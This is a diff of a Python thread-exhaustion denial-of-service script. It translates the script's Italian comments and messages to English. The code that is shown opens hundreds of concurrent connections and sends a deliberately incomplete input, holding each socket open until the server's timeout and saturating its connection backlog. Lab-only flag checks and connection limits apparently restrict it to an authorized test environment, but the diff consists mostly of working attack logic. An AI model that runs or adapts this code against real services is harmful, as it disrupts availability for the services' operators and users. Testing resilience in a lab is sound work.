@@ -46,7 +46,7 @@ def attack_worker(queue, target_host, target_port, duration):
             # Creazione socket con ottimizzazioni per alta frequenza
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            sock.settimeout(2.0) # Timeout aggressivo lato client per non rallentare l'attacco
+            sock.settimeout(2.0) # Aggressive client-side timeout to keep the test responsive.
             
             # Connessione immediata
             sock.connect((target_host, target_port))
@@ -58,18 +58,18 @@ def attack_worker(queue, target_host, target_port, duration):
             except socket.timeout:
                 pass
 
-            # Invia una scelta incompleta senza i caratteri di terminazione (\n o \r\n).
+            # Send an incomplete selection without line terminators.
             # Questo costringe conn.recv(1024) su service.py ad attendere nel blocco try per 10 secondi.
             sock.send(b"1") 
 
-            # Mantiene il socket aperto fino al termine della finestra temporale dell'attacco
-            # o finché il server non forza il timeout di 10 secondi.
+            # Keep the socket open until the attack window ends or the server
+            # enforces its 10-second timeout.
             remaining = end_time - time.time()
             if remaining > 0:
                 time.sleep(min(8.5, remaining)) 
 
         except (OSError, socket.error):
-            # Ignora gli errori di connessione rifiutata (segno che la coda BACKLOG=50 è satura)
+            # Ignore refused connections, which indicate that the backlog is saturated.
             pass
         finally:
             if sock:
@@ -80,31 +80,31 @@ def attack_worker(queue, target_host, target_port, duration):
             queue.task_done()
 
 def main():
-    parser = argparse.ArgumentParser(description="Simulatore di Attacco ad Alta Densità (Thread Exhaustion)")
+    parser = argparse.ArgumentParser(description="High-density controlled attack simulator (thread exhaustion)")
     parser.add_argument("target_host", help="IP o Hostname del server target")
     parser.add_argument("target_port", type=int, help="Porta TCP del servizio (es. 9000)")
-    parser.add_argument("-c", "--connections", type=int, default=1500, help="Numero di connessioni totali da scatenare")
+    parser.add_argument("-c", "--connections", type=int, default=1500, help="Total number of connections to create")
     parser.add_argument("-w", "--workers", type=int, default=500, help="Numero di thread concorrenti sull'attaccante")
-    parser.add_argument("-d", "--duration", type=int, default=60, help="Durata dell'attacco in secondi")
-    parser.add_argument("--lab-only", action="store_true", help="Dichiarazione uso legittimo in laboratorio")
+    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
+    parser.add_argument("--lab-only", action="store_true", help="Confirmation of authorized lab-only use")
 
     args = parser.parse_args()
 
     if not args.lab_only or not is_allowed_target(args.target_host):
-        print("[ERRORE] Target non autorizzato o parametro --lab-only mancante.")
+        print("[ERROR] Unauthorized target or missing --lab-only parameter.")
         return
 
     if args.connections > MAX_CONNECTIONS or args.workers > MAX_WORKERS:
-        print(f"[ERRORE] I parametri superano le soglie massime del laboratorio.")
+        print("[ERROR] Parameters exceed the lab safety limits.")
         return
 
     print(f"[*] ATTACCO AVVIATO su {args.target_host}:{args.target_port}")
-    print(f"[*] Configurazione: {args.workers} workers invieranno {args.connections} connessioni sospese...")
+    print(f"[*] Configuration: {args.workers} workers will send {args.connections} suspended connections...")
 
     queue = Queue()
     worker_threads = []
 
-    # Generazione immediata del pool di thread d'attacco (Thread Storm)
+    # Create the attack thread pool immediately.
     for _ in range(args.workers):
         t = Thread(target=attack_worker, args=(queue, args.target_host, args.target_port, args.duration), daemon=True)
         t.start()
@@ -122,10 +122,10 @@ def main():
     try:
         queue.join()
     except KeyboardInterrupt:
-        print("\n[!] Interruzione manuale richiesta.")
+        print("\n[!] Manual interruption requested.")
 
     elapsed = time.time() - start_time
-    print(f"[*] Attacco completato in {elapsed:.2f} secondi. Verificare i log di errore del server.")
+    print(f"[*] Attack completed in {elapsed:.2f} seconds. Check the server error logs.")
 
 if __name__ == "__main__":
     main()
